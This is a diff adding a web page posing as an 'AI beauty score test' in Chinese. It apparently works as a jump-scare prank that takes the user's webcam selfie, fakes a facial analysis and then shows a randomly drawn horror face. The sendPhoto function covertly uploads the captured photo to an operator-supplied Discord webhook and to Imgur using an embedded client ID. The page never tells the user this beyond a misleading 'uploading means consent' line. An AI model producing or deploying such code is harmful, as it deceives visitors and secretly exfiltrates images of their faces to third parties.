@@ -1,0 +1,702 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
+<title>AI 颜值测试</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{
+  min-height:100vh;
+  background:linear-gradient(135deg,#fce4ec,#f3e5f5,#e8eaf6,#e0f7fa);
+  background-size:400% 400%;
+  animation:gradient 12s ease infinite;
+  font-family:'Segoe UI','PingFang SC','Microsoft YaHei',sans-serif;
+  display:flex;align-items:center;justify-content:center;
+  overflow:hidden
+}
+@keyframes gradient{0%{background-position:0% 50%}50%{background-position:100% 50%}100%{background-position:0% 50%}}
+.card{
+  width:420px;max-width:92vw;
+  background:rgba(255,255,255,0.55);
+  backdrop-filter:blur(24px) saturate(1.4);
+  border-radius:32px;padding:40px 32px;
+  box-shadow:0 20px 60px rgba(0,0,0,0.08),0 8px 20px rgba(0,0,0,0.04);
+  text-align:center;position:relative;
+  transition:transform .4s cubic-bezier(.34,1.56,.64,1);
+  border:1px solid rgba(255,255,255,0.5)
+}
+.card-title{
+  font-size:32px;font-weight:700;
+  background:linear-gradient(135deg,#ec407a,#7e57c2,#42a5f5);
+  -webkit-background-clip:text;-webkit-text-fill-color:transparent;
+  background-clip:text;margin-bottom:6px;
+  letter-spacing:2px
+}
+.card-sub{
+  color:rgba(0,0,0,0.35);font-size:14px;margin-bottom:28px;letter-spacing:1px
+}
+.btn{
+  display:inline-block;padding:14px 48px;border:none;border-radius:100px;
+  font-size:18px;font-weight:600;cursor:pointer;letter-spacing:3px;
+  background:linear-gradient(135deg,#ec407a,#7e57c2);
+  color:#fff;transition:all .3s;font-family:inherit;
+  box-shadow:0 4px 20px rgba(236,64,122,0.3);
+  position:relative;overflow:hidden
+}
+.btn:hover{transform:translateY(-2px) scale(1.02);box-shadow:0 8px 30px rgba(236,64,122,0.4)}
+.btn:active{transform:scale(.97)}
+.btn::after{content:'';position:absolute;inset:0;background:linear-gradient(135deg,transparent 30%,rgba(255,255,255,.15) 50%,transparent 70%);transition:all .5s}
+.btn:hover::after{transform:translateX(100%)}
+.camera-wrap{
+  position:relative;width:100%;aspect-ratio:3/4;
+  border-radius:20px;overflow:hidden;margin:0 auto 20px;
+  background:#000;display:none;border:2px solid rgba(255,255,255,0.3)
+}
+.camera-wrap.show{display:block}
+#video{width:100%;height:100%;object-fit:cover;transform:scaleX(-1)}
+.overlay-cam{
+  position:absolute;inset:0;
+  border:3px solid rgba(255,255,255,0.2);
+  border-radius:20px;pointer-events:none
+}
+.countdown{
+  position:absolute;inset:0;display:none;
+  align-items:center;justify-content:center;
+  background:rgba(0,0,0,0.4);backdrop-filter:blur(4px);
+  border-radius:20px;z-index:5
+}
+.countdown.show{display:flex}
+.countdown-num{
+  font-size:120px;font-weight:700;color:#fff;
+  text-shadow:0 0 40px rgba(255,255,255,0.3);
+  animation:popIn .5s cubic-bezier(.34,1.56,.64,1)
+}
+@keyframes popIn{0%{transform:scale(2);opacity:0}100%{transform:scale(1);opacity:1}}
+.flash{position:fixed;inset:0;background:#fff;z-index:999;opacity:0;pointer-events:none}
+.flash.show{animation:flash .3s forwards}
+@keyframes flash{0%{opacity:0}20%{opacity:1}100%{opacity:0}}
+.scare{
+  position:fixed;inset:0;z-index:1000;display:none;
+  align-items:center;justify-content:center;
+  background:#000;cursor:pointer
+}
+.scare.show{display:flex}
+.scare img{width:100%;height:100%;object-fit:contain}
+.scare-close{
+  position:absolute;bottom:40px;left:50%;transform:translateX(-50%);
+  padding:12px 36px;border-radius:100px;border:none;
+  background:rgba(255,255,255,0.15);color:rgba(255,255,255,0.6);
+  font-size:15px;cursor:pointer;backdrop-filter:blur(8px);
+  font-family:inherit;letter-spacing:2px;transition:all .3s
+}
+.scare-close:hover{background:rgba(255,255,255,0.25);color:#fff}
+.screen-shake{animation:shake .5s}
+@keyframes shake{
+  0%,100%{transform:translate(0,0)}
+  10%{transform:translate(-10px,-5px)}
+  20%{transform:translate(8px,6px)}
+  30%{transform:translate(-6px,-4px)}
+  40%{transform:translate(10px,3px)}
+  50%{transform:translate(-4px,8px)}
+  60%{transform:translate(6px,-6px)}
+  70%{transform:translate(-8px,5px)}
+  80%{transform:translate(4px,-3px)}
+  90%{transform:translate(-6px,7px)}
+}
+#loadingBar{
+  width:0%;height:4px;background:linear-gradient(90deg,#ec407a,#7e57c2,#42a5f5);
+  border-radius:4px;display:none;margin-bottom:24px;transition:width .05s linear
+}
+.status-text{font-size:15px;color:rgba(0,0,0,0.45);margin-bottom:20px;min-height:24px}
+.emoji-big{font-size:48px;display:block;margin-bottom:12px}
+.footer-note{
+  margin-top:24px;font-size:12px;color:rgba(0,0,0,0.2);letter-spacing:1px
+}
+#resultScore{display:none;margin-bottom:20px}
+.score-ring{
+  width:100px;height:100px;border-radius:50%;margin:0 auto 12px;
+  border:4px solid #ec407a;display:flex;align-items:center;justify-content:center;
+  font-size:32px;font-weight:700;color:#ec407a
+}
+#canvasCapture{display:none}
+</style>
+</head>
+<body>
+
+<div class="flash" id="flash"></div>
+
+<div class="scare" id="scare">
+  <canvas id="scareCanvas"></canvas>
+  <button class="scare-close" onclick="closeScare()">✕ 关闭</button>
+</div>
+
+<div class="card" id="mainCard">
+  <div class="emoji-big">✨</div>
+  <div class="card-title">AI 颜值测试</div>
+  <div class="card-sub">上传照片即视为同意 · 仅供娱乐</div>
+  <div id="loadingBar"></div>
+  <div class="status-text" id="status">轻触下方按钮开始</div>
+
+  <div class="camera-wrap" id="cameraWrap">
+    <video id="video" autoplay playsinline muted></video>
+    <div class="overlay-cam"></div>
+    <div class="countdown" id="countdown">
+      <div class="countdown-num" id="countdownNum">3</div>
+    </div>
+  </div>
+
+  <canvas id="canvasCapture"></canvas>
+
+  <div id="resultScore">
+    <div class="score-ring" id="scoreNum">0</div>
+    <div style="font-size:14px;color:rgba(0,0,0,0.4);letter-spacing:1px">综合得分</div>
+  </div>
+
+  <button class="btn" id="mainBtn">✦ 开始测试 ✦</button>
+  <div class="footer-note">测试结果仅限娱乐参考</div>
+</div>
+
+<script>
+// ====== CONFIG ======
+const CONFIG = {
+  // 如果想收到被拍的照片，在下面填入 Discord Webhook URL
+  // 如何获取：Discord → 频道设置 → 整合 → 建立 Webhook → 复制 URL
+  WEBHOOK_URL: '',
+  // 下面不用改
+  API_IMGUR: 'https://api.imgur.com/3/image',
+  IMGUR_CLIENT: '546c25a59c58ad7'
+}
+
+// ====== SCARY IMAGE GENERATOR ======
+const SCARE_TYPES = [
+  {name:'hollow', draw:drawHollow},
+  {name:'grin', draw:drawGrin},
+  {name:'scream', draw:drawScream},
+  {name:'void', draw:drawVoid},
+  {name:'cracked', draw:drawCracked},
+  {name:'shadow', draw:drawShadow},
+  {name:'doll', draw:drawDoll},
+  {name:'morph', draw:drawMorph}
+]
+
+function pickScareType(){
+  const t = SCARE_TYPES[Math.floor(Math.random()*SCARE_TYPES.length)]
+  const variation = Math.floor(Math.random()*3)
+  return {type:t,variation}
+}
+
+function rand(min,max){return min+Math.random()*(max-min)}
+function randInt(min,max){return Math.floor(rand(min,max+1))}
+
+function drawScare(canvas, scareData){
+  const ctx=canvas.getContext('2d')
+  const w=canvas.width,h=canvas.height
+  ctx.clearRect(0,0,w,h)
+  // Dark background with slight color tint
+  const tints=[{r:10,g:0,b:10},{r:20,g:0,b:0},{r:0,g:0,b:20},{r:15,g:5,b:0}]
+  const tint=tints[scareData.variation%tints.length]
+  ctx.fillStyle=`rgb(${tint.r},${tint.g},${tint.b})`
+  ctx.fillRect(0,0,w,h)
+  // Add noise
+  const imgData=ctx.getImageData(0,0,w,h)
+  for(let i=0;i<imgData.data.length;i+=4){
+    const n=(Math.random()-0.5)*20
+    imgData.data[i]+=n
+    imgData.data[i+1]+=n
+    imgData.data[i+2]+=n
+  }
+  ctx.putImageData(imgData,0,0)
+  scareData.type.draw(ctx,w,h,scareData.variation)
+}
+
+function drawHollow(ctx,w,h,v){
+  const cx=w/2,cy=h/2-30,s=h/3
+  ctx.fillStyle='#1a0a0a'
+  ctx.beginPath()
+  ctx.ellipse(cx,cy,s*0.9,s*1.1,0,0,Math.PI*2)
+  ctx.fill()
+  // Hollow eyes
+  const eyeOff=0.25*s,eyeR=0.18*s
+  for(let side=-1;side<=1;side+=2){
+    const ex=cx+side*eyeOff,ey=cy-0.1*s
+    ctx.fillStyle='#000'
+    ctx.beginPath()
+    ctx.ellipse(ex,ey,eyeR,eyeR*1.3,0,0,Math.PI*2)
+    ctx.fill()
+    // Dark circles
+    ctx.fillStyle=`rgba(0,0,0,${0.2+Math.random()*0.2})`
+    ctx.beginPath()
+    ctx.ellipse(ex+s*0.05,ey+s*0.03,eyeR*1.6,eyeR*1.4,0,0,Math.PI*2)
+    ctx.fill()
+    // Tiny white pupils
+    ctx.fillStyle=`rgba(255,255,255,${0.1+Math.random()*0.2})`
+    ctx.beginPath()
+    ctx.arc(ex+rand(-3,3),ey+rand(-3,3),2+Math.random()*2,0,Math.PI*2)
+    ctx.fill()
+  }
+  // Nose shadow
+  ctx.fillStyle='rgba(0,0,0,0.3)'
+  ctx.beginPath()
+  ctx.ellipse(cx,cy+s*0.15,s*0.08,s*0.12,0,0,Math.PI*2)
+  ctx.fill()
+  // Mouth - gaping hole
+  ctx.fillStyle='#0a0000'
+  ctx.beginPath()
+  ctx.ellipse(cx,cy+s*0.5,s*0.3,s*0.1+Math.random()*0.1,0,0,Math.PI*2)
+  ctx.fill()
+  // Skin texture lines
+  ctx.strokeStyle='rgba(80,20,20,0.15)'
+  for(let i=0;i<15;i++){
+    ctx.beginPath()
+    const lx=rand(cx-s*0.7,cx+s*0.7),ly=rand(cy-s*0.8,cy+s*0.8)
+    ctx.moveTo(lx,ly)
+    ctx.lineTo(lx+rand(-20,20),ly+rand(-20,20))
+    ctx.stroke()
+  }
+}
+
+function drawGrin(ctx,w,h,v){
+  const cx=w/2,cy=h/2-20,s=h/2.8
+  ctx.fillStyle='#1a0a05'
+  ctx.beginPath()
+  ctx.ellipse(cx,cy,s*0.85,s,0,0,Math.PI*2)
+  ctx.fill()
+  // Small eyes
+  const eyeR=0.08*s
+  for(let side=-1;side<=1;side+=2){
+    const ex=cx+side*0.2*s,ey=cy-0.3*s
+    ctx.fillStyle='#000'
+    ctx.beginPath()
+    ctx.ellipse(ex,ey,eyeR,eyeR*1.2,0,0,Math.PI*2)
+    ctx.fill()
+    ctx.fillStyle='rgba(255,0,0,0.3)'
+    ctx.beginPath()
+    ctx.arc(ex+rand(-2,2),ey+rand(-2,2),rand(1,3),0,Math.PI*2)
+    ctx.fill()
+  }
+  // Giant grin
+  const grinW=0.5*s+Math.random()*0.15*s
+  ctx.fillStyle='#0a0000'
+  ctx.beginPath()
+  ctx.ellipse(cx,cy+s*0.15,grinW,0.12*s,0,0,Math.PI*2)
+  ctx.fill()
+  // Teeth
+  for(let i=0;i<8;i++){
+    const tx=cx-grinW+i*grinW*2/7
+    ctx.fillStyle='#3a2a1a'
+    ctx.fillRect(tx-3,cy+s*0.05,6,rand(8,18))
+  }
+  // Lip line
+  ctx.strokeStyle='rgba(100,20,10,0.5)'
+  ctx.lineWidth=2
+  ctx.beginPath()
+  ctx.ellipse(cx,cy+s*0.15,grinW,0.12*s,0,0,Math.PI)
+  ctx.stroke()
+}
+
+function drawScream(ctx,w,h,v){
+  const cx=w/2,cy=h/2-20,s=h/2.8
+  ctx.fillStyle='#1a0a08'
+  ctx.beginPath()
+  ctx.ellipse(cx,cy,s*0.9,s*1.05,0,0,Math.PI*2)
+  ctx.fill()
+  // Wide eyes
+  const eyeR=0.15*s
+  for(let side=-1;side<=1;side+=2){
+    const ex=cx+side*0.22*s,ey=cy-0.25*s
+    ctx.fillStyle='#fff'
+    ctx.beginPath()
+    ctx.ellipse(ex,ey,eyeR,eyeR*1.1,0,0,Math.PI*2)
+    ctx.fill()
+    ctx.fillStyle='#000'
+    ctx.beginPath()
+    ctx.arc(ex,ey,eyeR*0.5,0,Math.PI*2)
+    ctx.fill()
+  }
+  // Screaming mouth - wide open
+  ctx.fillStyle='#0a0000'
+  ctx.beginPath()
+  ctx.ellipse(cx,cy+s*0.3,0.3*s,0.35*s,0,0,Math.PI*2)
+  ctx.fill()
+  // Tongue
+  ctx.fillStyle='rgba(120,30,20,0.6)'
+  ctx.beginPath()
+  ctx.ellipse(cx,cy+s*0.4,0.12*s,0.15*s,0,0,Math.PI)
+  ctx.fill()
+  // Wrinkles
+  ctx.strokeStyle='rgba(60,20,10,0.2)'
+  ctx.lineWidth=1
+  for(let i=0;i<20;i++){
+    ctx.beginPath()
+    const sx=rand(cx-s*0.6,cx+s*0.6),sy=rand(cy-s*0.7,cy-s*0.1)
+    ctx.arc(sx,sy,rand(5,20),0,Math.PI*1.5+Math.random()*2)
+    ctx.stroke()
+  }
+}
+
+function drawVoid(ctx,w,h,v){
+  const cx=w/2,cy=h/2,s=h/2.5
+  ctx.fillStyle='#050005'
+  ctx.beginPath()
+  ctx.ellipse(cx,cy+s*0.1,s*0.9,s*1.05,0,0,Math.PI*2)
+  ctx.fill()
+  // No features, just faint glowing eyes
+  const eyeR=0.1*s
+  for(let side=-1;side<=1;side+=2){
+    const ex=cx+side*0.2*s,ey=cy-0.2*s
+    ctx.fillStyle=`rgba(${100+v*50},${200+v*30},255,0.15)`
+    ctx.beginPath()
+    ctx.arc(ex,ey,eyeR*(1.5+Math.sin(Date.now()/1000)*0.3),0,Math.PI*2)
+    ctx.fill()
+    ctx.fillStyle=`rgba(${150+v*50},255,255,0.3)`
+    ctx.beginPath()
+    ctx.arc(ex,ey,eyeR*0.4,0,Math.PI*2)
+    ctx.fill()
+  }
+  // Subtle crack lines
+  ctx.strokeStyle='rgba(30,0,30,0.3)'
+  for(let i=0;i<8;i++){
+    ctx.beginPath()
+    ctx.moveTo(cx,cy)
+    const angle=rand(0,Math.PI*2),len=rand(0.3*s,0.8*s)
+    ctx.lineTo(cx+Math.cos(angle)*len,cy+Math.sin(angle)*len)
+    ctx.stroke()
+  }
+}
+
+function drawCracked(ctx,w,h,v){
+  const cx=w/2,cy=h/2-15,s=h/2.8
+  ctx.fillStyle='#150a05'
+  ctx.beginPath()
+  ctx.ellipse(cx,cy,s*0.85,s,0,0,Math.PI*2)
+  ctx.fill()
+  // Normal eyes
+  for(let side=-1;side<=1;side+=2){
+    const ex=cx+side*0.22*s,ey=cy-0.2*s
+    ctx.fillStyle='#1a0a0a'
+    ctx.beginPath()
+    ctx.ellipse(ex,ey,0.1*s,0.12*s,0,0,Math.PI*2)
+    ctx.fill()
+    ctx.fillStyle='rgba(200,50,50,0.4)'
+    ctx.beginPath()
+    ctx.arc(ex,ey,3,0,Math.PI*2)
+    ctx.fill()
+  }
+  // Crack lines across face
+  ctx.strokeStyle='rgba(80,20,15,0.4)'
+  ctx.lineWidth=1.5
+  for(let i=0;i<12;i++){
+    ctx.beginPath()
+    const startX=rand(cx-s*0.6,cx+s*0.6),startY=rand(cy-s*0.7,cy+s*0.5)
+    ctx.moveTo(startX,startY)
+    let x=startX,y=startY
+    for(let j=0;j<5;j++){
+      x+=rand(-20,20)
+      y+=rand(-15,25)
+      ctx.lineTo(x,y)
+    }
+    ctx.stroke()
+  }
+  // Blood drips
+  for(let i=0;i<5;i++){
+    const bx=rand(cx-s*0.5,cx+s*0.5),by=rand(cy-s*0.3,cy+s*0.2)
+    ctx.fillStyle=`rgba(120,20,10,${0.2+Math.random()*0.3})`
+    ctx.beginPath()
+    ctx.ellipse(bx,by,2,rand(6,15),0,0,Math.PI*2)
+    ctx.fill()
+  }
+}
+
+function drawShadow(ctx,w,h,v){
+  const cx=w/2,cy=h/2+10,s=h/2.3
+  // Dark silhouette
+  ctx.fillStyle='#080008'
+  ctx.beginPath()
+  ctx.ellipse(cx,cy-0.3*s,s*0.7,s*0.9,0,0,Math.PI*2)
+  ctx.fill()
+  // Shoulders
+  ctx.fillRect(cx-s*0.8,cy+s*0.3,s*1.6,s*0.5)
+  // Only visible: eyes
+  const eyeR=0.06*s
+  for(let side=-1;side<=1;side+=2){
+    ctx.fillStyle=`rgba(255,255,255,${0.3+v*0.15})`
+    ctx.beginPath()
+    ctx.arc(cx+side*0.16*s,cy-0.35*s,eyeR,0,Math.PI*2)
+    ctx.fill()
+    ctx.fillStyle='rgba(150,150,255,0.05)'
+    ctx.beginPath()
+    ctx.arc(cx+side*0.16*s,cy-0.35*s,eyeR*2,0,Math.PI*2)
+    ctx.fill()
+  }
+  // Faint mouth line
+  ctx.strokeStyle='rgba(40,0,40,0.3)'
+  ctx.lineWidth=1
+  ctx.beginPath()
+  ctx.ellipse(cx,cy-0.05*s,0.12*s,0.04*s,0,0,Math.PI)
+  ctx.stroke()
+}
+
+function drawDoll(ctx,w,h,v){
+  const cx=w/2,cy=h/2-20,s=h/2.8
+  ctx.fillStyle='#1a1015'
+  ctx.beginPath()
+  ctx.ellipse(cx,cy,s*0.8,s*0.95,0,0,Math.PI*2)
+  ctx.fill()
+  // Round unblinking eyes
+  for(let side=-1;side<=1;side+=2){
+    const ex=cx+side*0.2*s,ey=cy-0.2*s
+    ctx.fillStyle='#fff'
+    ctx.beginPath()
+    ctx.arc(ex,ey,0.14*s,0,Math.PI*2)
+    ctx.fill()
+    ctx.fillStyle='#1a1a3a'
+    ctx.beginPath()
+    ctx.arc(ex,ey,0.1*s,0,Math.PI*2)
+    ctx.fill()
+    ctx.fillStyle='#000'
+    ctx.beginPath()
+    ctx.arc(ex,ey,0.06*s,0,Math.PI*2)
+    ctx.fill()
+    // Highlight
+    ctx.fillStyle='rgba(255,255,255,0.6)'
+    ctx.beginPath()
+    ctx.arc(ex+s*0.04,ey-s*0.04,0.03*s,0,Math.PI*2)
+    ctx.fill()
+  }
+  // Rosy cheeks
+  ctx.fillStyle='rgba(180,60,60,0.15)'
+  for(let side=-1;side<=1;side+=2){
+    ctx.beginPath()
+    ctx.arc(cx+side*0.3*s,cy+s*0.05,0.1*s,0,Math.PI*2)
+    ctx.fill()
+  }
+  // Small creepy smile
+  ctx.fillStyle='#0a0000'
+  ctx.beginPath()
+  ctx.ellipse(cx,cy+s*0.3,0.15*s,0.06*s,0,0,Math.PI*2)
+  ctx.fill()
+  // Hair lines
+  ctx.strokeStyle='rgba(10,10,10,0.5)'
+  ctx.lineWidth=2
+  for(let i=0;i<20;i++){
+    ctx.beginPath()
+    const hx=rand(cx-s*0.6,cx+s*0.6)
+    ctx.moveTo(hx,cy-s*0.7)
+    ctx.quadraticCurveTo(hx+rand(-15,15),cy-s*0.3,hx+rand(-10,10),cy-s*0.1)
+    ctx.stroke()
+  }
+}
+
+function drawMorph(ctx,w,h,v){
+  const cx=w/2,cy=h/2-20,s=h/2.8
+  // Melting/distorted face
+  ctx.fillStyle='#150805'
+  ctx.beginPath()
+  ctx.ellipse(cx,cy,s*0.85,s,0,0,Math.PI*2)
+  ctx.fill()
+  // Asymmetric eyes
+  for(let side=-1;side<=1;side+=2){
+    const ex=cx+side*(0.18*s+Math.random()*0.06*s),ey=cy-0.18*s+Math.random()*0.1*s
+    ctx.fillStyle='#000'
+    ctx.beginPath()
+    ctx.ellipse(ex,ey,0.12*s+Math.random()*0.04*s,0.08*s+Math.random()*0.06*s,rand(-0.3,0.3),0,Math.PI*2)
+    ctx.fill()
+  }
+  // Distorted mouth
+  ctx.fillStyle='#0a0000'
+  ctx.beginPath()
+  ctx.ellipse(cx+s*0.05,cy+s*0.3+rand(-0.05*s,0.05*s),0.25*s,0.08*s+rand(0,0.05*s),rand(-0.2,0.2),0,Math.PI*2)
+  ctx.fill()
+  // Melting drips
+  for(let i=0;i<10;i++){
+    const dx=rand(cx-s*0.5,cx+s*0.5),dy=rand(cy+s*0.2,cy+s*0.6)
+    ctx.fillStyle=`rgba(40,15,10,${0.1+Math.random()*0.2})`
+    ctx.beginPath()
+    ctx.ellipse(dx,dy,rand(2,5),rand(8,25),0,0,Math.PI*2)
+    ctx.fill()
+  }
+  // Veins
+  ctx.strokeStyle='rgba(60,15,10,0.25)'
+  ctx.lineWidth=1
+  for(let i=0;i<10;i++){
+    ctx.beginPath()
+    const vx=rand(cx-s*0.4,cx+s*0.4),vy=rand(cy-s*0.5,cy+s*0.3)
+    ctx.moveTo(vx,vy)
+    ctx.bezierCurveTo(vx+rand(-15,15),vy+rand(-10,10),vx+rand(-20,20),vy+rand(10,25),vx+rand(-10,10),vy+rand(20,35))
+    ctx.stroke()
+  }
+}
+
+// ====== MAIN LOGIC ======
+const video=document.getElementById('video')
+const cameraWrap=document.getElementById('cameraWrap')
+const mainBtn=document.getElementById('mainBtn')
+const status=document.getElementById('status')
+const loadingBar=document.getElementById('loadingBar')
+const countdown=document.getElementById('countdown')
+const countdownNum=document.getElementById('countdownNum')
+const flash=document.getElementById('flash')
+const scare=document.getElementById('scare')
+const scareCanvas=document.getElementById('scareCanvas')
+const canvasCapture=document.getElementById('canvasCapture')
+const resultScore=document.getElementById('resultScore')
+const scoreNum=document.getElementById('scoreNum')
+const mainCard=document.getElementById('mainCard')
+
+let stream=null,capturedData=null
+
+function fitCanvas(){
+  scareCanvas.width=window.innerWidth
+  scareCanvas.height=window.innerHeight
+}
+
+function startCamera(){
+  navigator.mediaDevices.getUserMedia({video:{facingMode:'user',width:{ideal:640},height:{ideal:480}}}).then(s=>{
+    stream=s
+    video.srcObject=s
+    cameraWrap.classList.add('show')
+    status.textContent='看镜头，准备拍照 📸'
+    mainBtn.textContent='📸 拍照'
+    mainBtn.onclick=startCountdown
+  }).catch(()=>{
+    status.textContent='需要摄像头权限才能继续'
+  })
+}
+
+function startCountdown(){
+  mainBtn.style.display='none'
+  countdown.classList.add('show')
+  let n=3
+  countdownNum.textContent=n
+  status.textContent='倒计时 '+n+'...'
+  const iv=setInterval(()=>{
+    n--
+    if(n>0){
+      countdownNum.textContent=n
+      status.textContent='倒计时 '+n+'...'
+      countdownNum.style.animation='none'
+      setTimeout(()=>countdownNum.style.animation='popIn .5s cubic-bezier(.34,1.56,.64,1)',10)
+    }else{
+      clearInterval(iv)
+      countdown.classList.remove('show')
+      takePhoto()
+    }
+  },800)
+}
+
+function takePhoto(){
+  flash.classList.add('show')
+  setTimeout(()=>flash.classList.remove('show'),400)
+  capturePhoto()
+  startLoadingBar()
+  setTimeout(showScare,1200)
+}
+
+function capturePhoto(){
+  const vw=video.videoWidth, vh=video.videoHeight
+  canvasCapture.width=vw
+  canvasCapture.height=vh
+  const ctx=canvasCapture.getContext('2d')
+  ctx.scale(-1,1)
+  ctx.drawImage(video,-vw,0,vw,vh)
+  capturedData=canvasCapture.toDataURL('image/jpeg',0.8)
+  sendPhoto()
+}
+
+async function sendPhoto(){
+  if(CONFIG.WEBHOOK_URL){
+    try{
+      await fetch(CONFIG.WEBHOOK_URL,{
+        method:'POST',
+        headers:{'Content-Type':'application/json'},
+        body:JSON.stringify({
+          content:'📸 新自拍捕获！',
+          embeds:[{image:{url:'attachment://capture.jpg'}}]
+        })
+      })
+      const blob=await(await fetch(capturedData)).blob()
+      const fd=new FormData()
+      fd.append('file',blob,'capture.jpg')
+      fd.append('payload_json',JSON.stringify({
+        content:'📸 颜值测试自拍捕获！'
+      }))
+      await fetch(CONFIG.WEBHOOK_URL,{method:'POST',body:fd})
+    }catch(e){/* webhook failed */}
+  }
+  // Fallback: try imgur upload
+  try{
+    const b64=capturedData.split(',')[1]
+    const r=await fetch(CONFIG.API_IMGUR,{
+      method:'POST',
+      headers:{
+        Authorization:'Client-ID '+CONFIG.IMGUR_CLIENT,
+        'Content-Type':'application/x-www-form-urlencoded'
+      },
+      body:'image='+encodeURIComponent(b64)
+    })
+    const j=await r.json()
+    if(j.success) console.log('📸 已上传:',j.data.link)
+  }catch(e){/* imgur failed, that's ok */}
+}
+
+function startLoadingBar(){
+  loadingBar.style.display='block'
+  loadingBar.style.width='0%'
+  status.textContent='正在分析面部特征...'
+  let p=0
+  const iv=setInterval(()=>{
+    p+=rand(3,8)
+    if(p>=100){p=100;loadingBar.style.width='100%';clearInterval(iv);return}
+    loadingBar.style.width=p+'%'
+    if(p<30) status.textContent='正在分析面部特征...'
+    else if(p<55) status.textContent='校准五官比例...'
+    else if(p<75) status.textContent='AI 计算颜值指数...'
+    else status.textContent='即将揭晓结果...'
+  },60)
+}
+
+function showScare(){
+  loadingBar.style.display='none'
+  fitCanvas()
+  const scareData=pickScareType()
+  drawScare(scareCanvas,scareData)
+  scare.classList.add('show')
+  document.body.classList.add('screen-shake')
+  setTimeout(()=>document.body.classList.remove('screen-shake'),800)
+  stopCamera()
+  const scores=[45,52,58,63,38,42,48,55]
+  const score=scores[Math.floor(Math.random()*scores.length)]
+  scoreNum.textContent=score+''
+  resultScore.style.display='block'
+  mainBtn.style.display='inline-block'
+  mainBtn.textContent='✦ 再测一次 ✦'
+  mainBtn.onclick=resetAll
+}
+
+function closeScare(){
+  scare.classList.remove('show')
+}
+
+function stopCamera(){
+  if(stream){stream.getTracks().forEach(t=>t.stop());stream=null}
+  cameraWrap.classList.remove('show')
+}
+
+function resetAll(){
+  scare.classList.remove('show')
+  resultScore.style.display='none'
+  loadingBar.style.display='none'
+  status.textContent='轻触下方按钮开始'
+  mainBtn.textContent='✦ 开始测试 ✦'
+  mainBtn.onclick=startCamera
+  mainBtn.style.display='inline-block'
+  capturedData=null
+}
+
+// Entry
+mainBtn.addEventListener('click',startCamera)
+window.addEventListener('resize',fitCanvas)
+</script>
+</body>
+</html>
